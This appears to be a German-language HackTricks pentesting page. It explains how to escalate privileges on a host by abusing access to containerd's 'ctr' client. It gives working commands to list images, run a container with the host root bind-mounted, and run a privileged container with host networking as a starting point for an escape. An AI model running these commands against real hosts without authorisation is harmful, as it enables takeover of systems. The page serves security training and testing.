# Containerd (ctr) Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende Informationen

Gehe zum folgenden Link, um zu erfahren, **wo `containerd` und `ctr` im Container-Stack einzuordnen sind**:

{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

Wenn du feststellst, dass ein Host den Befehl `ctr` enthält:
```bash
which ctr
/usr/bin/ctr
```
Du kannst die Images auflisten:
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
Und dann **eines dieser Images ausführen und dabei das Stammverzeichnis des Hosts darin einhängen**:
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Führe einen Container mit privilegierten Rechten aus und entkomme daraus.\
Du kannst einen privilegierten Container wie folgt ausführen:
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
Dann kannst du einige der auf der folgenden Seite erwähnten Techniken verwenden, um **durch den Missbrauch privilegierter capabilities daraus zu escape**:

{{#ref}}
container-security/
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
